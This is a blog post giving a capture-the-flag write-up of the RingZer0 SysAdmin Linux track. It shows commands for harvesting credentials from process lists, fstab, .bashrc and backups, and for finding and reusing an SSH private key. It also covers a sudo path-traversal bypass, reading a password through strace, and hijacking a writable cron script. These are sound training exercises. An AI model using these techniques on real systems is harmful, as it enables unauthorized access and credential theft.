---
layout: post
title: RingZer0 CTF - SysAdmin Linux
category: CTF
tags: RingZer0 Linux
date: 2022-07-02 18:32 +0300
---

# Preparation
We have to log in via `ssh` in this challenges, there's how to use it:

```bash
$ ssh $LOGIN@$HOSTNAME -p $PORT [-i $private_key]
```

# Level 1
![The 1st challenge](/assets/ringzer0/sysadmin_linux/level1.png)

## Solution
In this challenge we just have to explore the system. We will find the flag in `process list`.

```bash
morpheus@sysadmin-track:~$ ps -ax
... output ...
    393 ?        S      1:05 /bin/sh /root/backup.sh -u trinity -p Flag-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX # Edited
... output ...
```

# Level 2
![the 2nd challenge](/assets/ringzer0/sysadmin_linux/level2.png)

## Solution
We have to find the password, so we can search by string with `grep`

![grep string searching](/assets/ringzer0/sysadmin_linux/grep_architect.png)

The are several parameters here:
* `-i` to ignore the case
* `-r` to search recursive
* `-l` to only list file paths

/etc/fstab looks strange here, let's check it

```bash
morpheus@sysadmin-track:~$ grep architect /etc/fstab
#//TheMAtrix/phone  /media/Matrix  cifs  username=architect,password=$(base64 -d "EDITED BASE64 STRING"),iocharset=utf8,sec=ntlm  0  0
```

There is a base64 string, we decode it and get the flag!

```bash
morpheus@sysadmin-track:~$ echo "EDITED BASE64 STRING" | base64 -d && echo
FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX # EDITED
```

# Level 3
![The 3rd challenge](/assets/ringzer0/sysadmin_linux/level3.png)

## Solution
The authors specified the user for that flag. We note it and search for `readble` files that user `owns`.

```bash
architect@sysadmin-track:~$ find / -type f -user architect 2>/dev/null| head
/var/www/index.php
/proc/1335166/task/1335166/fdinfo/0
/proc/1335166/task/1335166/fdinfo/1
/proc/1335166/task/1335166/fdinfo/2
... output ...
```

We see the index.php file. Read it.

![index_php file](/assets/ringzer0/sysadmin_linux/index_php_file.png)

There are credentials for mysql, dig deeper!

```bash
architect@sysadmin-track:~$ mysql -u arch -p
Enter password:
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| arch               |
| information_schema |
+--------------------+

mysql> use arch

Database changed
mysql> show tables;
+----------------+
| Tables_in_arch |
+----------------+
| arch           |
| flag           |
+----------------+

mysql> select * from flag;
+---------------------------------------+
| flag                                  |
+---------------------------------------+
| FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX | # EDITED
+---------------------------------------+

```

# Level 4
![The 4th challenge](/assets/ringzer0/sysadmin_linux/level4.png)

## Solution
Note that we just need an access to the account. So we don't have to find password. Maybe look for a ssh `private key`?

```bash
morpheus@sysadmin-track:~$ grep -iRl 'BEGIN RSA PRIVATE KEY' / 2>/dev/null
/backup/c074fa6ec17bb35e168366c43cf4cd19
```

We're lucky! We open that file and copy key to our local machine.

![Level4 id_rsa found](/assets/ringzer0/sysadmin_linux/id_rsa_in_backups.png)

Don't forget to make right permissions to a file.

```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa oracle@challenges.ringzer0team.com -p 10146
oracle@sysadmin-track:~$ cat flag.txt | base64 -d && echo
FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX # EDITED
```

The flag was encoded by `base64`, so we docode it with a command.

# Level 5
![The 5th challenge](/assets/ringzer0/sysadmin_linux/level5.png)

## Solution
At first, we list all files in oracle's folder.

![oracles folder](/assets/ringzer0/sysadmin_linux/oracle_files.png)

We see that encflag.txt.enc is an `openssl` encrypted file.

![encrypted file](/assets/ringzer0/sysadmin_linux/encfile.png)

We don't have a password, so we have to search. Luckly, the password was nearby.

```bash
cat .bashrc
... output ...
alias reveal="openssl enc -aes-256-cbc -a -d -pbkdf2 -in encflag.txt.enc -k 'lp6PWgOwDctq5Yx7ntTmBpOISc'"
... output ...
oracle@sysadmin-track:~$ reveal
FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX # EDITED
```

# Level 6
![The 6th challenge](/assets/ringzer0/sysadmin_linux/level6.png)

## Solution
In this challenge, we have a file called phonebook, we can see a `path` here.

```bash
trinity@sysadmin-track:~$ ls -la
total 24
drwxr-x--- 2 trinity trinity 4096 Apr 23 14:11 .
drwxr-xr-x 9 root    root    4096 Apr 23 14:09 ..
lrwxrwxrwx 1 root    root       9 Apr 23 14:11 .bash_history -> /dev/null
-rwxr-x--- 1 trinity trinity  252 Apr 23 14:08 .bash_logout
-rwxr-x--- 1 trinity trinity 2632 Apr 23 14:08 .bashrc
-rwxr-x--- 1 trinity trinity  124 Apr 23 14:08 phonebook
-rwxr-x--- 1 trinity trinity  674 Apr 23 14:08 .profile
trinity@sysadmin-track:~$ cat phonebook
The Oracle        1800-133-7133
Persephone        345-555-1244





copy made by Cypher copy utility on /home/neo/phonebook
```

Also, we if we can run something with `sudo`.

```bash
trinity@sysadmin-track:~$ sudo -l
[sudo] password for trinity:
Matching Defaults entries for trinity on sysadmin-track:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User trinity may run the following commands on sysadmin-track:
    (neo) /bin/cat /home/trinity/*
```

We can bypass it by `../` (directory up). Let's read the file that we've noted.

```bash
trinity@sysadmin-track:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
The Oracle        1800-133-7133
Persephone        345-555-1244




change my current password FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
don't forget to remove this :)
```

# Level 7
![The 7th challenge](/assets/ringzer0/sysadmin_linux/level7.png)

## Solution
We have to check user's process list there.

![neos processes](/assets/ringzer0/sysadmin_linux/neo_processes.png)

We can see some strange process, but we can trace the process with `strace`.

```bash
neo@sysadmin-track:~$ strace -p1311365
strace: Process 1311365 attached
restart_syscall(<... resuming interrupted read ...>) = 0
write(-1, "telnet 127.0.0.1 23\n", 20)  = -1 EBADF (Bad file descriptor)
write(-1, "user\n", 5)                  = -1 EBADF (Bad file descriptor)
write(-1, "FLAG-XXXXXXXXXXXXXXXXXXXXXXXXX\n", 31) = -1 EBADF (Bad file descriptor) # EDITED
write(-1, "get-cpuinfo\n", 12)          = -1 EBADF (Bad file descriptor)
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=10, tv_nsec=0}, 0x7ffe4a1b4430) = 0
```

# Level 8
![The 8th challenge](/assets/ringzer0/sysadmin_linux/level8.png)

## Solution
Here we have to search something associated with cypher.

```bash
morpheus@sysadmin-track:~$ grep -irl cypher / 2>/dev/null
... output ...
/backup/776d27d2a429e63bbc3cb29183417bb2
/backup/3dab3277410dddca016834f91d172027
/backup/ca584b15ae397a9ad45b1ff267b55796
... output ...
```

There is something in the backups!

![cyphers cronjob](/assets/ringzer0/sysadmin_linux/cypher_cron.png)

cypher has a `cronjob`, let's explore the script.

![cyphers script](/assets/ringzer0/sysadmin_linux/cypher_script.png)

It is a `python` file and we can write in it. Now we have several ways to move next, i.e. get a reverse shell, but I choosed just to read files in cypher's home directory. We modify the file to output content in /tmp/gather.log and wait...

```bash
morpheus@sysadmin-track:/backup$ vim /tmp/Gathering.py # vim is cool!
morpheus@sysadmin-track:/backup$ cat /tmp/gather.log
BASE ?
'BASE64 EDITED STRING' # EDITED
... output ...
morpheus@sysadmin-track:/backup$ echo 'BASE64 EDITED STRING' | base64 -d && echo
FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX #EDITED
```

Decode base64 string and get the flag!

# Conclusion
It was a cool track, I've really enjoyed it!

Thank you for reading, I hope it was useful for you ❤️
